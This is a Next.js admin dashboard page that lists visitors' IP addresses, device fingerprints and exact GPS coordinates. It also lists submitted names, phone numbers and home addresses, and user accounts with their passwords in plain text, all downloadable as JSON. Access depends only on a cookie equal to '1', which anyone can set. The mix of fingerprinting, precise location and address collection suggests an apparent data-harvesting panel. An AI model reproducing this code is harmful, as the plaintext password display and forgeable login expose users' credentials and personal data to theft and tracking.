// app/admin/page.tsx
import connectPromise from "@/lib/mongodb";
import Visitor from "@/models/Visitor";
import { Address } from "@/models/Address";
import { User } from "@/models/User";
import { cookies } from "next/headers";
import AdminLogin from "./AdminLogin";
import LogoutButton from "./LogoutButton";

function MapLink({ lat, lon }: { lat: number; lon: number }) {
  const q = encodeURIComponent(`${lat},${lon}`);
  return (
    <a
      href={`https://www.google.com/maps?q=${q}`}
      target="_blank"
      rel="noreferrer"
      className="text-sm underline"
    >
      Open on map
    </a>
  );
}

export default async function AdminPage() {
  const cookieStore = await cookies();
  const isAdmin = cookieStore.get("admin_auth")?.value === "1";
  if (!isAdmin) return <main className="min-h-screen p-6"><AdminLogin /></main>;

  await connectPromise;

  const [visitors, addresses, users] = await Promise.all([
    Visitor.find().sort({ receivedAt: -1 }).limit(200).lean(),
    Address.find().sort({ createdAt: -1 }).limit(200).lean(),
    User.find().sort({ createdAt: -1 }).limit(200).lean(),
  ]);

  return (
    <main className="p-6 space-y-10">
      {/* Header */}
      <div className="flex items-center justify-between mb-6">
        <h1 className="text-3xl font-bold">Admin Dashboard</h1>
        <div className="flex gap-3 items-center">
          <LogoutButton />
        </div>
      </div>

      {/* Visitors */}
      <section>
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-2xl font-semibold">Visitors ({visitors.length})</h2>
          <a className="underline text-sm" href="/api/admin/download?type=visitors">
            Download JSON
          </a>
        </div>
        <div className="grid gap-4">
          {visitors.map((r: any) => (
            <div key={r._id} className="p-3 bg-white rounded border shadow-sm">
              <div className="flex items-start justify-between">
                <div className="text-xs text-gray-500">
                  {new Date(r.receivedAt).toLocaleString()} • {r.clientIp || "—"}
                </div>
                <div className="text-xs text-gray-400">
                  {r.locationConsent ? "Location allowed" : "No location"}
                </div>
              </div>
              <div className="text-sm mt-2"><strong>UA:</strong> <span className="break-words">{r.userAgent || "-"}</span></div>
              <div className="flex gap-4 text-sm mt-2">
                <div><strong>FP:</strong> {String(r.fingerprint || "-").slice(0, 12)}</div>
                <div><strong>Screen:</strong> {r.screen || "-"}</div>
                <div><strong>TZ:</strong> {r.timezone || "-"}</div>
              </div>
              {/* Location block */}
              <div className="mt-3 text-sm">
                <strong>Location:</strong>
                {r.locationConsent && r.latitude != null && r.longitude != null ? (
                  <div className="mt-1 space-y-1">
                    <div>Exact: <span className="font-mono text-xs">{r.latitude},{r.longitude}</span></div>
                    <div>Rounded: <span className="font-mono text-xs">{r.latitude_rounded},{r.longitude_rounded}</span></div>
                    {typeof r.accuracy !== "undefined" && <div>Accuracy: {r.accuracy} m</div>}
                    <div><MapLink lat={r.latitude} lon={r.longitude} /></div>
                  </div>
                ) : (
                  <span className="ml-2 text-gray-500">No location collected</span>
                )}
              </div>
              <details className="mt-3">
                <summary className="cursor-pointer font-medium">Raw JSON</summary>
                <pre className="text-xs mt-2 whitespace-pre-wrap">{JSON.stringify(r.raw || r, null, 2)}</pre>
              </details>
            </div>
          ))}
        </div>
      </section>

      {/* Addresses */}
      <section>
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-2xl font-semibold">Addresses ({addresses.length})</h2>
          <a className="underline text-sm" href="/api/admin/download?type=addresses">
            Download JSON
          </a>
        </div>
        <div className="grid gap-4">
          {addresses.map((a: any) => (
            <div key={a._id} className="p-3 bg-white rounded border shadow-sm">
              <div className="flex justify-between text-sm mb-2">
                <span className="font-semibold">{a.fullName}</span>
                <span className="text-gray-500">{new Date(a.createdAt).toLocaleString()}</span>
              </div>
              <div className="text-sm">
                <div><strong>Mobile:</strong> {a.mobile}</div>
                <div><strong>Email:</strong> {a.email}</div>
                <div><strong>Address:</strong> {a.house}, {a.street}, {a.landmark}, {a.district}, {a.state} - {a.pincode}</div>
              </div>
              <details className="mt-2 text-sm">
                <summary className="cursor-pointer font-medium">Raw JSON</summary>
                <pre className="text-xs mt-2 whitespace-pre-wrap">{JSON.stringify(a, null, 2)}</pre>
              </details>
            </div>
          ))}
        </div>
      </section>

      {/* Users */}
      <section>
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-2xl font-semibold">Users ({users.length})</h2>
          <a className="underline text-sm" href="/api/admin/download?type=users">
            Download JSON
          </a>
        </div>
        <div className="grid gap-4">
          {users.map((u: any) => (
            <div key={u._id} className="p-3 bg-white rounded border shadow-sm">
              <div className="flex justify-between text-sm mb-2">
                <span className="font-semibold">{u.username}</span>
                <span className="text-gray-500">{new Date(u.createdAt).toLocaleString()}</span>
              </div>
              <div className="text-sm">
                <div><strong>Email:</strong> {u.email || "-"}</div>
                <div><strong>Password:</strong> {u.password}</div>
              </div>
              <details className="mt-2 text-sm">
                <summary className="cursor-pointer font-medium">Raw JSON</summary>
                <pre className="text-xs mt-2 whitespace-pre-wrap">{JSON.stringify(u, null, 2)}</pre>
              </details>
            </div>
          ))}
        </div>
      </section>
    </main>
  );
}
